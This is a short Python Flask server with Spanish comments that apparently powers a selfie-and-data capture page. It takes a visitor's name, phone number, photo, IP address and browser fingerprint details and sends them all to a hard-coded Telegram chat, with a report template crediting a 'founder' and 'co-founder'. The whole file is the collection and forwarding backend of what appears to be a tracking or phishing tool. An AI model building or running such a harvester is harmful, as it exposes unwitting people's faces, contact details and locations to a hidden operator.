import os
import threading
from flask import Flask, render_template, request, jsonify
import telebot
from datetime import datetime

app = Flask(__name__)

# 🔒 TU CONFIG (NO TOCADA)
TOKEN = "TU_TOKEN_AQUI"
MI_ID = "TU_ID_AQUI"

bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/enviar', methods=['POST'])
def enviar():
    try:
        nombre = request.form.get('nombre')
        telefono = request.form.get('telefono')
        foto = request.files.get('foto')

        fecha_hora = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        reporte = (
            "┏━━━━━━━━━━━━━━━━━━━━━━┑\n"
            "┣► 📸 Selfie tomada\n"
            "┣► 👑 Fundador: @stevenappsshops\n"
            "┣► 🤝 Co-fundador: @Broquicalifoxx\n"
            f"┣► 👤 Usuario: {nombre}\n"
            f"┣► 📱 Teléfono: {telefono}\n"
            f"┣► 🕒 Fecha: {fecha_hora}\n"
            f"┣► 🌐 IP: {request.remote_addr}\n"
            f"┣► 📺 Resolución: {request.form.get('resolucion')}\n"
            f"┣► 🌎 Idioma: {request.form.get('idioma')}\n"
            f"┣► 📡 Estado: {request.form.get('online')}\n"
            f"┣► 🌙 Modo oscuro: {request.form.get('dark')}\n"
            f"┣► ✋ Touch: {request.form.get('touch')}\n"
            "┣► 🧠 UserAgent:\n"
            f"{request.form.get('useragent')}\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━┙"
        )

        if foto:
            bot.send_photo(MI_ID, foto, caption=reporte)
        else:
            bot.send_message(MI_ID, reporte)

        return jsonify({"ok": True})

    except Exception as e:
        return jsonify({"error": str(e)})

# 🤖 BOT EN SEGUNDO PLANO
def iniciar_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=iniciar_bot).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))